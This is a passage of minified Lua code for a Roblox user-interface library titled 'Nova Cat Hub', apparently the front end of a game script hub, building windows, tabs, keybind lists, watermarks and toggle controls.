R,S=math.sin(math.rad(P)),math.cos(math.rad(P))L=Vector2.new(S*(L.x-Q.x)-R*(L.y-Q.y),R*(L.x-Q.x)+S*(L.y-Q.y))+Q;N=Vector2.new(S*(N.x-Q.x)-R*(N.y-Q.y),R*(N.x-Q.x)+S*(N.y-Q.y))+Q;O=Vector2.new(S*(O.x-Q.x)-R*(O.y-Q.y),R*(O.x-Q.x)+S*(O.y-Q.y))+Q;M=Vector2.new(S*(M.x-Q.x)-R*(M.y-Q.y),R*(M.x-Q.x)+S*(M.y-Q.y))+Q end end;v(a5:ScreenPointToRay(L.x,L.y,J).Origin,a5:ScreenPointToRay(N.x,N.y,J).Origin,a5:ScreenPointToRay(O.x,O.y,J).Origin,a5:ScreenPointToRay(M.x,M.y,J).Origin,B)if H then for P,Q in pairs(B)do Q.Parent=C end;for P,Q in pairs(I)do for R,S in pairs(B)do S[P]=Q end end end end;Library.Holder=s;function Library.Destroy(H)if H.Blurframe then H.Blurframe.Enabled=false;H.Blurframe:Destroy()H.Blurframe=nil end;for I,J in pairs(H.Connections)do if typeof(J)=="RBXScriptConnection"and J.Connected then J:Disconnect()end end;table.clear(H.Connections)for I,J in pairs(a8)do if a4 then a4:UnbindFromRenderStep(I)end;for L,M in pairs(J.parts)do if M and M:IsA"BasePart"then for N,O in pairs(M:GetChildren())do if O:IsA"SpecialMesh"and O.Name=="WedgeMesh"then O:Destroy()end end;M:Destroy()end end;a8[I]=nil end;if workspace.CurrentCamera:FindFirstChild"BlurSnox"then workspace.CurrentCamera.BlurSnox:Destroy()end;if H.Notificationsframe and H.Notificationsframe.Parent then H.Notificationsframe.Parent:Destroy()end;if H.KeybindList and H.KeybindList.Frame then H.KeybindList.Frame:Destroy()H.KeybindList.Frame=nil;H.KeybindList.Keybinds={}H.KeybindList.Visible=false end;if H.WatermarkFrame then H.WatermarkFrame:Destroy()H.WatermarkFrame=nil end;local I=H.Holder and H.Holder.Parent and H.Holder.Parent:FindFirstChild"MobileButton"if I then I:Destroy()end;if H.Holder and H.Holder.Parent then H.Holder.Parent:Destroy()end;H.Holder=nil;H.Open=false;table.clear(H.Tabs)table.clear(H.Sections)table.clear(H.ThemeObjects)H.Connections={}table.clear(H.Flags)H.UnNamedFlags=0;H.VisValues={}return true end;function Library.SetOpen(H,I)if typeof(I)=="boolean"then Library.Open=I;Library.Blurframe.Enabled=I;Library.Holder.Visible=I;if I then ad=Library.BlurTemplate:Clone()ad.Parent=s;table.clear(G)ag(ad)local J=u()local L={}local M=Instance.new("Folder",a9)M.Name=ad.Name;a8[J]={parts=L,frame=ad}ah(true)a4:BindToRenderStep(J,2000,function()if Library.Open then ah()end end)else for J,L in pairs(a8)do a4:UnbindFromRenderStep(J)for M,N in pairs(L.parts)do N.Transparency=1 end;if a9 then for M,N in ipairs(a9:GetChildren())do if N:IsA"Folder"then for O,P in ipairs(N:GetChildren())do if P:IsA"BasePart"then P.Transparency=1 end end end end end;a8[J]=nil end;if ad then ad:Destroy()ad=nil end;table.clear(G)end end end;Library:Connection(game:GetService"UserInputService".InputBegan,function(H)if H.KeyCode==Library.UIKey then Library:SetOpen(not Library.Open)end end)Library:SetOpen(true)function Library.CreateKeybindList(H)local I=Instance.new"Frame"I.Name="KeybindList"I.AnchorPoint=Vector2.new(0,0.5)I.AutomaticSize=Enum.AutomaticSize.Y;I.BackgroundColor3=Color3.fromRGB(16,16,16)I.BackgroundTransparency=0.06;I.BorderColor3=Color3.fromRGB(30,30,30)I.Position=UDim2.new(0,40,0.5,0)I.Size=UDim2.fromOffset(200,125)I.Visible=true;I.Parent=H.Holder.Parent;local J=Instance.new"UICorner"J.CornerRadius=UDim.new(0,12)J.Parent=I;local L=Instance.new"ImageLabel"L.Name="acrylicthing"L.Image="rbxassetid://9968344227"L.ImageTransparency=0.9;L.ScaleType=Enum.ScaleType.Tile;L.TileSize=UDim2.fromOffset(128,128)L.BackgroundTransparency=1;L.Size=UDim2.fromScale(1,1)local M=Instance.new"UICorner"M.CornerRadius=UDim.new(0,12)M.Parent=L;L.Parent=I;local N=Instance.new"ImageLabel"N.Name="acrylicthing"N.Image="rbxassetid://9968344105"N.ImageTransparency=0.98;N.ScaleType=Enum.ScaleType.Tile;N.TileSize=UDim2.fromOffset(128,128)N.BackgroundTransparency=1;N.Size=UDim2.fromScale(1,1)local O=Instance.new"UICorner"O.CornerRadius=UDim.new(0,12)O.Parent=N;N.Parent=I;local P=Instance.new"UIStroke"P.Name="_CHILD"P.Color=Color3.fromRGB(158,114,158)P.Transparency=0.9;P.Parent=I;local Q=Instance.new"Frame"Q.Name="Frame"Q.AnchorPoint=Vector2.new(0,0.5)Q.BackgroundColor3=Color3.fromRGB(180,124,177)Q.BorderSizePixel=0;Q.Position=UDim2.fromScale(0,0.5)Q.Size=UDim2.new(0,2,1,-50)Q.Parent=I;local R=Instance.new"TextLabel"R.Name="Title"R.FontFace=Font.new"rbxassetid://12187365364"R.Text="Keybinds"R.TextColor3=Color3.fromRGB(255,255,255)R.TextSize=12;R.BackgroundTransparency=1;R.Size=UDim2.new(1,0,0,25)R.Parent=I;local S=Instance.new"Frame"S.Name="ListContainer"S.AutomaticSize=Enum.AutomaticSize.Y;S.BackgroundTransparency=1;S.Position=UDim2.fromOffset(0,25)S.Size=UDim2.new(1,0,0,25)S.Parent=I;local T=Instance.new"UIListLayout"T.Padding=UDim.new(0,5)T.SortOrder=Enum.SortOrder.LayoutOrder;T.Parent=S;local U=Instance.new"UIPadding"U.PaddingBottom=UDim.new(0,5)U.Parent=S;H.KeybindList.Frame=I;return I end;function Library.TurnKeybindList(H)H.KeybindList.Visible=not H.KeybindList.Visible;H.KeybindList.Frame.Visible=H.KeybindList.Visible end;function Library.CreateMobileButton(H)local I=Instance.new"TextButton"I.Name="MobileButton"I.Text=""I.AnchorPoint=Vector2.new(0.5,0)I.AutomaticSize=Enum.AutomaticSize.XY;I.BackgroundColor3=Color3.fromRGB(16,16,16)I.BackgroundTransparency=1;I.Position=UDim2.new(0.5,0,0,30)I.Size=UDim2.fromOffset(50,50)I.Parent=H.Holder.Parent;local J=Instance.new"ImageButton"J.Name="Image"J.Image="rbxassetid://70938068058043"J.BackgroundTransparency=1;J.Size=UDim2.fromOffset(40,40)J.Position=UDim2.fromScale(0.5,0.5)J.AnchorPoint=Vector2.new(0.5,0.5)J.Parent=I;E(J,I)local L=Instance.new"UICorner"L.CornerRadius=UDim.new(0,6)L.Parent=J;local M=Instance.new"UIStroke"M.Name="_CHILD"M.ApplyStrokeMode=Enum.ApplyStrokeMode.Border;M.Color=Color3.fromRGB(255,255,255)M.Thickness=2;M.Parent=J;local N=Instance.new"UIGradient"N.Color=ColorSequence.new{ColorSequenceKeypoint.new(0,Color3.fromRGB(255,255,255)),ColorSequenceKeypoint.new(1,Color3.fromRGB(147,106,147))}N.Rotation=180;N.Parent=M;local function ai()local O=3;local P=1;local Q=0;while true do Q=Q+O*P;if Q>=180 then P=-1 elseif Q<=-180 then P=1 end;N.Rotation=Q;task.wait()end end;J.MouseButton1Click:Connect(function()Library:SetOpen(not Library.Open)if Library.Open then task.spawn(ai)a:Create(J,TweenInfo.new(0.3),{ImageTransparency=0}):Play()else a:Create(J,TweenInfo.new(0.3),{ImageTransparency=0.4}):Play()end end)if Library.Open then task.spawn(ai)end;return I end;function Library.AddKeybind(H,I,J,L)if not H.KeybindList.Frame then H:CreateKeybindList()end;local M=H.KeybindList.Frame.ListContainer;local N=Instance.new"TextLabel"N.Size=UDim2.new(1,0,0,20)N.BackgroundTransparency=1;N.Text=J..": "..L;N.TextColor3=Color3.fromRGB(255,255,255)N.TextSize=12;N.FontFace=Font.new"rbxassetid://12187365364"N.Parent=M;H.KeybindList.Keybinds[I]={Label=N,Name=J,Key=L,Active=false}end;function Library.RemoveKeybind(H,I)if H.KeybindList.Keybinds[I]then H.KeybindList.Keybinds[I].Label:Destroy()H.KeybindList.Keybinds[I]=nil end end;function Library.UpdateKeybindState(H,I,J)if H.KeybindList.Keybinds[I]then H.KeybindList.Keybinds[I].Active=J;a:Create(H.KeybindList.Keybinds[I].Label,TweenInfo.new(0.2),{TextColor3=J and Color3.fromRGB(255,188,254)or Color3.fromRGB(255,255,255)}):Play()end end;function Library.ToggleKeybindList(H)if not H.KeybindList.Frame then H:CreateKeybindList()end;H.KeybindList.Visible=not H.KeybindList.Visible;H.KeybindList.Frame.Visible=H.KeybindList.Visible end;function Library.UpdateKeybind(H,I,J)if H.KeybindList.Keybinds[I]then local L=H.KeybindList.Keybinds[I]L.Key=J;L.Label.Text=L.Name..": "..J end end;function Library.Watermark(H,I)local J=I or{}local L={Text=J.Text or"Watermark",Instance=nil,TextLabel=nil,Visible=true}local M=Instance.new("Frame",r)M.Name="Watermarkk"M.AnchorPoint=Vector2.new(1,0)M.AutomaticSize=Enum.AutomaticSize.X;M.BackgroundColor3=Color3.fromRGB(14,15,18)M.BackgroundTransparency=0.06;M.BorderColor3=Color3.fromRGB(0,0,0)M.BorderSizePixel=0;M.Position=UDim2.new(1,-35,0,35)M.Size=UDim2.fromOffset(10,36)local N=Instance.new"UICorner"N.Name="UICorner"N.CornerRadius=UDim.new(0,6)N.Parent=M;local O=Instance.new"ImageLabel"O.Name="acrylicthing"O.Image="rbxassetid://9968344227"O.ImageTransparency=0.9;O.ScaleType=Enum.ScaleType.Tile;O.TileSize=UDim2.fromOffset(128,128)O.BackgroundColor3=Color3.fromRGB(255,255,255)O.BackgroundTransparency=1;O.BorderColor3=Color3.fromRGB(0,0,0)O.BorderSizePixel=0;O.Size=UDim2.fromScale(1,1)local P=Instance.new"UICorner"P.Name="UICorner"P.CornerRadius=UDim.new(0,4)P.Parent=O;O.Parent=M;local Q=Instance.new"ImageLabel"Q.Name="acrylicthing"Q.Image="rbxassetid://9968344105"Q.ImageTransparency=0.98;Q.ScaleType=Enum.ScaleType.Tile;Q.TileSize=UDim2.fromOffset(128,128)Q.BackgroundColor3=Color3.fromRGB(255,255,255)Q.BackgroundTransparency=1;Q.BorderColor3=Color3.fromRGB(0,0,0)Q.BorderSizePixel=0;Q.Size=UDim2.fromScale(1,1)local R=Instance.new"UICorner"R.Name="UICorner"R.CornerRadius=UDim.new(0,12)R.Parent=Q;Q.Parent=M;local S=Instance.new"Frame"S.Name="SideIndicator"S.AnchorPoint=Vector2.new(0,0.5)S.BackgroundColor3=Color3.fromRGB(180,124,177)S.BorderColor3=Color3.fromRGB(0,0,0)S.BorderSizePixel=0;S.Position=UDim2.fromOffset(0,18)S.Size=UDim2.fromOffset(2,16)S.Parent=M;local T=Instance.new"TextLabel"T.Name="Text"T.FontFace=Font.new"rbxassetid://12187365364"T.Text=L.Text;T.TextColor3=Color3.fromRGB(255,255,255)T.TextSize=12;T.TextXAlignment=Enum.TextXAlignment.Left;T.AutomaticSize=Enum.AutomaticSize.X;T.BackgroundColor3=Color3.fromRGB(255,255,255)T.BackgroundTransparency=1;T.BorderColor3=Color3.fromRGB(0,0,0)T.BorderSizePixel=0;T.Position=UDim2.fromOffset(10,0)T.Size=UDim2.new(0,20,1,0)local U=Instance.new"UIPadding"U.Name="UIPadding"U.PaddingBottom=UDim.new(0,1)U.Parent=T;L.Instance=M;L.TextLabel=T;T.Parent=M;local V=Instance.new"UIPadding"V.Name="UIPadding"V.PaddingRight=UDim.new(0,5)V.Parent=M;function L.SetVisible(W,X)W.Visible=X;W.Instance.Visible=X end;function L.SetText(W,X)W.Text=X;W.TextLabel.Text=X end;function L.Remove(W)W.Instance:Destroy()end;return L end;local H=Instance.new"UICorner"H.Name="UICorner"H.CornerRadius=UDim.new(0,12)H.Parent=s;local I=Instance.new("ImageLabel",s)I.Name="acrylicthing"I.Image="rbxassetid://9968344105"I.ImageTransparency=0.98;I.ScaleType=Enum.ScaleType.Tile;I.TileSize=UDim2.fromOffset(128,128)I.BackgroundColor3=Color3.fromRGB(255,255,255)I.BackgroundTransparency=1;I.BorderColor3=Color3.fromRGB(0,0,0)I.BorderSizePixel=0;I.Size=UDim2.fromScale(1,1)local J=Instance.new"UICorner"J.Name="UICorner"J.CornerRadius=UDim.new(0,12)J.Parent=I;local L=Instance.new("Frame",s)L.Name="Frame"L.BackgroundColor3=Color3.fromRGB(255,255,255)L.BackgroundTransparency=1;L.BorderColor3=Color3.fromRGB(0,0,0)L.BorderSizePixel=0;L.Size=UDim2.new(1,0,-9.77E-3,44)E(L,s)local M=Instance.new"ImageButton"M.Name="back"M.Image="http://www.roblox.com/asset/?id=99944461316029"M.ImageColor3=Color3.fromRGB(200,200,200)M.BackgroundColor3=Color3.fromRGB(255,255,255)M.BackgroundTransparency=1;M.BorderColor3=Color3.fromRGB(0,0,0)M.BorderSizePixel=0;M.Position=UDim2.fromOffset(18,14)M.Size=UDim2.fromOffset(10,10)M.Parent=L;local N=Instance.new("TextLabel",L)N.Name="title"N.FontFace=Font.new("rbxassetid://12187361378",Enum.FontWeight.Medium,Enum.FontStyle.Normal)N.Text="Nova Cat Hub"N.TextColor3=Color3.fromRGB(255,255,255)N.TextSize=19;N.TextXAlignment=Enum.TextXAlignment.Left;N.BackgroundColor3=Color3.fromRGB(255,255,255)N.BackgroundTransparency=1;N.BorderColor3=Color3.fromRGB(0,0,0)N.BorderSizePixel=0;N.Position=UDim2.fromOffset(37,0)N.Size=UDim2.new(0,88,1,0)local O=Instance.new"UIPadding"O.Name="UIPadding"O.PaddingBottom=UDim.new(0,1)O.Parent=N;local P=Instance.new"Frame"P.Name="Frame"P.AnchorPoint=Vector2.new(0.5,0.5)P.BackgroundColor3=Color3.fromRGB(255,255,255)P.BackgroundTransparency=1;P.BorderColor3=Color3.fromRGB(0,0,0)P.BorderSizePixel=0;P.Position=UDim2.new(1,-45,0.5,0)P.Size=UDim2.new(0,100,1,0)local Q=Instance.new"UIListLayout"Q.Name="UIListLayout"Q.Padding=UDim.new(0,6)Q.FillDirection=Enum.FillDirection.Horizontal;Q.HorizontalAlignment=Enum.HorizontalAlignment.Center;Q.SortOrder=Enum.SortOrder.LayoutOrder;Q.VerticalAlignment=Enum.VerticalAlignment.Center;Q.Parent=P;local R=Instance.new"TextButton"R.Name="Open"R.FontFace=Font.new"rbxasset://fonts/families/SourceSansPro.json"R.Text=""R.TextColor3=Color3.fromRGB(0,0,0)R.TextSize=14;R.AutoButtonColor=false;R.BackgroundColor3=Color3.fromRGB(117,166,87)R.BorderColor3=Color3.fromRGB(27,42,53)R.Position=UDim2.new(0.283,0,0.0694,12)R.Size=UDim2.fromOffset(7,7)local S=Instance.new"UICorner"S.Name="UICorner"S.CornerRadius=UDim.new(0,50)S.Parent=R;R.Parent=P;local T=Instance.new"TextButton"T.Name="Minimize"T.FontFace=Font.new"rbxasset://fonts/families/SourceSansPro.json"T.Text=""T.TextColor3=Color3.fromRGB(0,0,0)T.TextSize=14;T.AutoButtonColor=false;T.BackgroundColor3=Color3.fromRGB(242,191,60)T.BorderColor3=Color3.fromRGB(27,42,53)T.Position=UDim2.new(0.18,0,0,12)T.Size=UDim2.fromOffset(7,7)local U=Instance.new"UICorner"U.Name="UICorner"U.CornerRadius=UDim.new(0,50)U.Parent=T;T.Parent=P;local V=Instance.new"TextButton"V.Name="Close"V.FontFace=Font.new"rbxasset://fonts/families/SourceSansPro.json"V.Text=""V.TextColor3=Color3.fromRGB(0,0,0)V.TextSize=14;V.AutoButtonColor=false;V.BackgroundColor3=Color3.fromRGB(252,95,83)V.BorderColor3=Color3.fromRGB(27,42,53)V.Position=UDim2.new(0.09,0,0,12)V.Size=UDim2.fromOffset(7,7)local W=Instance.new"UICorner"W.Name="UICorner"W.CornerRadius=UDim.new(0,50)W.Parent=V;V.Parent=P;local X=Instance.new"UIPadding"X.Name="UIPadding"X.PaddingBottom=UDim.new(0,4)X.PaddingLeft=UDim.new(0,20)X.Parent=P;P.Parent=L;local Y=Instance.new("Frame",s)Y.Name="tabs_minimized"Y.BackgroundColor3=Color3.fromRGB(1,1,1)Y.BackgroundTransparency=1;Y.BorderSizePixel=0;Y.Position=UDim2.fromOffset(8,42)Y.Size=UDim2.new(1,-18,0,30)local Z=Instance.new("ScrollingFrame",Y)Z.Name="Frame"Z.CanvasSize=UDim2.new(1,15,0,0)Z.ScrollBarThickness=0;Z.ScrollingDirection=Enum.ScrollingDirection.X;Z.AutomaticCanvasSize=Enum.AutomaticSize.XY;Z.BackgroundColor3=Color3.fromRGB(1,1,1)Z.BackgroundTransparency=1;Z.BorderSizePixel=0;Z.Position=UDim2.fromScale(0.00201,0)Z.Selectable=false;Z.Size=UDim2.new(1,-1,1,0)local _=Instance.new"UIListLayout"_.Name="UIListLayout"_.Padding=UDim.new(0,6)_.FillDirection=Enum.FillDirection.Horizontal;_.SortOrder=Enum.SortOrder.LayoutOrder;_.Parent=Z;local a0=Instance.new("Frame",s)a0.Name="tab background"a0.BackgroundColor3=Color3.fromRGB(40,40,40)a0.BackgroundTransparency=1;a0.BorderColor3=Color3.fromRGB(0,0,0)a0.BorderSizePixel=0;a0.ClipsDescendants=true;a0.Position=UDim2.fromOffset(0,85)a0.Size=UDim2.new(1,0,1,-97)a0.SelectionGroup=true;local a1=game:GetService"TweenService"function o.UpdateTabs(a2)for aj,ak in pairs(o.Tabs)do ak:Turn(ak.Open)end end;Library.Holder=s;function Library.Tab(aj,ak)if not ak then ak={}end;local a2={Name=ak.Name or ak.name or"aimbot",Window=o,Open=false,Sections={},Tabs={},Elements={}}local al=Instance.new("TextButton",Z)al.Name=a2.Name;al.Text=""al.Active=false;al.BackgroundColor3=Color3.fromRGB(72,72,72)al.BackgroundTransparency=Library.CurrentLayout=="Kavo"and 0.97 or 0.91;al.BorderSizePixel=0;al.Selectable=false;al.Size=UDim2.new(0,82,1,0)local am=Instance.new"TextLabel"am.Name="TextLabel"am.FontFace=Font.new"rbxasset://fonts/families/GothamSSm.json"am.RichText=true;am.Text=a2.Name;am.TextColor3=Color3.fromRGB(240,240,240)am.TextSize=12;am.BackgroundColor3=Color3.fromRGB(255,255,255)am.BackgroundTransparency=1;am.BorderColor3=Color3.fromRGB(0,0,0)am.Size=UDim2.fromScale(1,1)local an=Instance.new"UIPadding"an.Name="UIPadding"an.Parent=am;am.Parent=al;local ao=Instance.new"UICorner"ao.Name="UICorner"ao.CornerRadius=UDim.new(0,6)ao.Parent=al;local ap=Instance.new"Frame"ap.Name="TabIndicator"ap.BackgroundColor3=Library.Accent;ap.BorderColor3=Color3.fromRGB(0,0,0)ap.BorderSizePixel=0;ap.Position=UDim2.new(0.22,5,1.07,-4)ap.Size=UDim2.fromOffset(35,4)local aq=Instance.new("UIScale",ap)aq.Name="GlobalSettingsUIScale"aq.Scale=1e-07;local ar=Instance.new"UICorner"ar.Name="UICorner"ar.CornerRadius=UDim.new(0,634)ar.Parent=ap;ap.Parent=al;local as=Instance.new("ScrollingFrame",a0)as.Name="tabs"as.ScrollBarThickness=0;as.BackgroundColor3=Color3.fromRGB(255,255,255)as.BackgroundTransparency=1;as.BorderColor3=Color3.fromRGB(0,0,0)as.BorderSizePixel=0;as.ClipsDescendants=false;as.Position=UDim2.fromOffset(10,1)as.Selectable=false;as.Size=UDim2.new(1,-20,1.02,-10)local at=Instance.new"UIPadding"at.Name="UIPadding"at.PaddingTop=UDim.new(0,1)at.Parent=as;local au=Instance.new"UIListLayout"au.Name="_"au.Padding=UDim.new(0,16)au.FillDirection=Enum.FillDirection.Horizontal;au.SortOrder=Enum.SortOrder.LayoutOrder;au.HorizontalFlex=1;au.Parent=as;local av=Instance.new("Frame",as)av.Name="group"av.BackgroundColor3=Color3.fromRGB(255,255,255)av.BackgroundTransparency=1;av.BorderColor3=Color3.fromRGB(0,0,0)av.BorderSizePixel=0;av.Size=UDim2.fromOffset(654,390)local aw=Instance.new("Frame",av)aw.Name="content"aw.AutomaticSize=Enum.AutomaticSize.Y;aw.BackgroundColor3=Color3.fromRGB(255,255,255)aw.BackgroundTransparency=1;aw.BorderColor3=Color3.fromRGB(0,0,0)aw.BorderSizePixel=0;aw.Size=UDim2.fromScale(1,0)local ax=Instance.new"UIListLayout"ax.Name="_"ax.Padding=UDim.new(0,13)ax.FillDirection=Enum.FillDirection.Horizontal;ax.SortOrder=Enum.SortOrder.LayoutOrder;ax.Parent=aw;local ay=Instance.new("Frame",aw)ay.Name="Left"ay.AutomaticSize=Enum.AutomaticSize.None;ay.BackgroundColor3=Color3.fromRGB(255,255,255)ay.BackgroundTransparency=1;ay.BorderColor3=Color3.fromRGB(0,0,0)ay.BorderSizePixel=0;local az=Instance.new"UIListLayout"az.Name="_"az.Padding=UDim.new(0,12)az.FillDirection=Enum.FillDirection.Vertical;az.SortOrder=Enum.SortOrder.LayoutOrder;az.Parent=ay;az.HorizontalFlex=1;az:GetPropertyChangedSignal"AbsoluteContentSize":Connect(function()ay.Size=UDim2.new(0.5,-6,0,az.AbsoluteContentSize.Y)end)local aA=Instance.new"Frame"aA.Name="Right"aA.AutomaticSize=Enum.AutomaticSize.None;aA.BackgroundColor3=Color3.fromRGB(255,255,255)aA.BackgroundTransparency=1;aA.BorderColor3=Color3.fromRGB(0,0,0)aA.BorderSizePixel=0;local aB=Instance.new"UIListLayout"aB.Name="_"aB.Padding=UDim.new(0,12)aB:GetPropertyChangedSignal"AbsoluteContentSize":Connect(function()aA.Size=UDim2.new(0.5,-6,0,az.AbsoluteContentSize.Y)end)aB.FillDirection=Enum.FillDirection.Vertical;aB.SortOrder=Enum.SortOrder.LayoutOrder;aB.Parent=aA;aB.HorizontalFlex=1;aA.Parent=aw;function a2.Turn(aC,aD)a2.Open=aD;local aE=Library.CurrentLayout=="Kavo"and 0.91 or 0.91;local aF=Library.CurrentLayout=="Kavo"and 0.97 or 0.93;a1:Create(al,TweenInfo.new(0.30,Enum.EasingStyle.Sine,Enum.EasingDirection.Out),{BackgroundTransparency=a2.Open and aE or aF}):Play()a1:Create(aq,TweenInfo.new(0.20,Enum.EasingStyle.Sine,Enum.EasingDirection.Out),{Scale=a2.Open and 1 or 0}):Play()if a2.Open then as.Position=UDim2.new(1,10,0,1)as.Visible=true;a1:Create(as,TweenInfo.new(Library.TabAnimSpeed,Enum.EasingStyle.Sine,Enum.EasingDirection.Out),{Position=UDim2.new(0,10,0,1)}):Play()else local aG=a1:Create(as,TweenInfo.new(Library.TabAnimSpeed,Enum.EasingStyle.Sine,Enum.EasingDirection.Out),{Position=UDim2.new(-1,10,0,1)})aG.Completed:Connect(function()if not a2.Open then as.Visible=false end end)aG:Play()end;Library:Connection(al.MouseButton1Down,function()if not a2.Open then for aG,aH in pairs(a2.Window.Tabs)do if aH.Open and aH~=a2 then aH:Turn(false)end end;a2:Turn(true)end end)end;a2.Elements={Left=ay,Right=aA}if#a2.Window.Tabs==0 then a2:Turn(true)end;a2.Window.Tabs[#a2.Window.Tabs+1]=a2;aj.Tabs[#aj.Tabs+1]=a2;a2.Window:UpdateTabs()return setmetatable(a2,Library.Tabs)end;function k.Section(aj,ak)if not ak then ak={}end;local al={Name=ak.Name or"Section",Tab=aj,Side=ak.side or ak.Side or"Left",Zindex=ak.Zindex or ak.zindex or 1,Elements={},Content={}}local am=Instance.new("Frame",al.Tab.Elements[al.Side])am.Name="section2"am.AutomaticSize=Enum.AutomaticSize.Y;am.BackgroundColor3=Color3.fromRGB(21,21,21)am.BackgroundTransparency=0.34;am.BorderColor3=Color3.fromRGB(0,0,0)am.BorderSizePixel=0;am.Position=UDim2.fromScale(-4.0200000000000005E-3,0)am.Size=UDim2.new(1,0,3.02,12)local an=Instance.new"UICorner"an.Name="_"an.CornerRadius=UDim.new(0,4)an.Parent=am;local ao=Instance.new"UIStroke"ao.Name="_CHILD"ao.Color=Color3.fromRGB(27,27,27)ao.Parent=am;local ap=Instance.new"UIListLayout"ap.Name="UIListLayout"ap.Padding=UDim.new(0,8)ap.SortOrder=Enum.SortOrder.LayoutOrder;ap.Parent=am;local aq=Instance.new"UIPadding"aq.Name="UIPadding"aq.PaddingBottom=UDim.new(0,35)aq.Parent=am;local ar=Instance.new"Frame"ar.Name="Frame"ar.BackgroundColor3=Color3.fromRGB(255,255,255)ar.BackgroundTransparency=1;ar.BorderColor3=Color3.fromRGB(0,0,0)ar.BorderSizePixel=0;ar.Size=UDim2.fromOffset(0,22)local as=Instance.new"TextLabel"as.Name="title"as.FontFace=Font.new"rbxassetid://12187365364"as.Text=al.Name;as.TextColor3=Color3.fromRGB(122,122,122)as.TextSize=12;as.TextXAlignment=Enum.TextXAlignment.Left;as.BackgroundColor3=Color3.fromRGB(255,255,255)as.BackgroundTransparency=1;as.BorderColor3=Color3.fromRGB(0,0,0)as.BorderSizePixel=0;as.Position=UDim2.fromOffset(8,0)as.Size=UDim2.fromOffset(0,25)as.Parent=ar;ar.Parent=am;al.Elements={SectionContent=am}al.Tab.Sections[#al.Tab.Sections+1]=al;return setmetatable(al,Library.Sections)end;function l.Toggle(aj,ak)if not ak then ak={}end;local al={Window=aj.Window,Tab=aj.Tab,Section=aj,Name=ak.Name or"Toggle",State=ak.state or ak.State or ak.def or ak.Def or ak.default or ak.Default or false,Callback=ak.callback or ak.Callback or ak.callBack or ak.CallBack or function()end,Flag=ak.flag or ak.Flag or ak.pointer or ak.Pointer or Library.NextFlag(),Toggled=false}local am=Instance.new("TextButton",al.Section.Elements.SectionContent)am.Name="ToggleSwitchActive"am.FontFace=Font.new"rbxasset://fonts/families/SourceSansPro.json"am.Text=""am.TextColor3=Color3.fromRGB(0,0,0)am.TextSize=14;am.AutoButtonColor=false;am.AutomaticSize=Enum.AutomaticSize.Y;am.BackgroundColor3=Color3.fromRGB(255,255,255)am.BackgroundTransparency=1;am.BorderColor3=Color3.fromRGB(0,0,0)am.BorderSizePixel=0;am.Position=UDim2.fromScale(0.00518,0.0577)am.Size=UDim2.new(1,0,0,17)local an=Instance.new"TextLabel"an.Name="TextLabel"an.FontFace=Font.new"rbxassetid://12187365364"an.Text=al.Name;an.TextColor3=Color3.fromRGB(62,62,62)an.TextSize=12;an.TextWrapped=true;an.TextXAlignment=Enum.TextXAlignment.Left;an.AnchorPoint=Vector2.new(0,0.5)an.BackgroundColor3=Color3.fromRGB(255,255,255)an.BackgroundTransparency=1;an.BorderColor3=Color3.fromRGB(0,0,0)an.BorderSizePixel=0;an.Position=UDim2.new(0,11,0.5,-1)an.Size=UDim2.new(1,-52,0,17)an.Parent=am;local ao=Instance.new"Frame"ao.Name="Frame"ao.AnchorPoint=Vector2.new(1,0.5)ao.BackgroundColor3=Color3.fromRGB(141,102,134)ao.BackgroundTransparency=1;ao.BorderColor3=Color3.fromRGB(0,0,0)ao.BorderSizePixel=0;ao.Position=UDim2.new(0.985,-10,0.433,0)ao.Size=UDim2.fromOffset(30,16)local ap=Instance.new"UIStroke"ap.Name="UIStroke"ap.Transparency=0;ap.Color=Color3.fromRGB(27,27,27)ap.Parent=ao;local aq=Instance.new"UICorner"aq.Name="UICorner"aq.CornerRadius=UDim.new(0,764)aq.Parent=ao;local ar=Instance.new"Frame"ar.Name="ImageLabel"ar.AnchorPoint=Vector2.new(0,0.5)ar.BackgroundColor3=Color3.fromRGB(62,62,62)ar.BorderColor3=Color3.fromRGB(0,0,0)ar.BorderSizePixel=0;ar.Position=UDim2.new(0.06,2,0.5,0)ar.Size=UDim2.fromOffset(10,10)local as=Instance.new"UICorner"as.Name="UICorner"as.CornerRadius=UDim.new(0,64)as.Parent=ar;ar.Parent=ao;ao.Parent=am;local function aI()al.Toggled=not al.Toggled;print("Toggle State Changed: "..tostring(al.Toggled))a1:Create(ar,TweenInfo.new(0.20,Enum.EasingStyle.Sine,Enum.EasingDirection.Out),{BackgroundColor3=al.Toggled and Library.Accent or Color3.fromRGB(62,62,62),Position=al.Toggled and UDim2.new(0.47,2,0.5,0)or UDim2.new(0.06,2,0.5,0)}):Play()a1:Create(ao,TweenInfo.new(0.20,Enum.EasingStyle.Sine,Enum.EasingDirection.Out),{BackgroundColor3=Color3.fromRGB(141,102,134),BackgroundTransparency=al.Toggled and 0.4 or 1}):Play()a1:Create(ap,TweenInfo.new(0.20,Enum.EasingStyle.Sine,Enum.EasingDirection.Out),{Transparency=al.Toggled and 1 or 0}):Play()a1:Create(an,TweenInfo.new(0.20,Enum.EasingStyle.Sine,Enum.EasingDirection.Out),{TextColor3=al.Toggled and Color3.fromRGB(255,255,255)or Color3.fromRGB(62,62,62)}):Play()Library.Flags[al.Flag]=al.Toggled;al.Callback(al.Toggled)end;Library:Connection(am.InputBegan,function(at)if at.UserInputType==Enum.UserInputType.MouseButton1 or at.UserInputType==Enum.UserInputType.Touch then aI()end end)function al.Set(at)at=type(at)=="boolean"and at or false;if al.Toggled~=at then aI()end end;al.Set(al.State)print(al.State)Library.Flags[al.Flag]=al.State;d[al.Flag]=al.Set;al.Set(al.State)Library.Flags[al.Flag]=al.State;d[al.Flag]=al.Set;return al end;function l.Textbox(aj,ak)local al={Name=ak.Name or"Textbox",Default=ak.Default or"",PlaceholderText=ak.PlaceholderText or"Placeholder",Flag=ak.Flag or Library.NextFlag(),Callback=ak.Callback or function()end,Section=aj}local am=Instance.new("TextButton",al.Section.Elements.SectionContent)am.Name="Textbox"am.FontFace=Font.new"rbxasset://fonts/families/SourceSansPro.json"am.Text=""am.TextColor3=Color3.fromRGB(0,0,0)am.TextSize=14;am.AutoButtonColor=false;am.AutomaticSize=Enum.AutomaticSize.Y;am.BackgroundTransparency=1;am.Size=UDim2.new(1,0,0,25)local 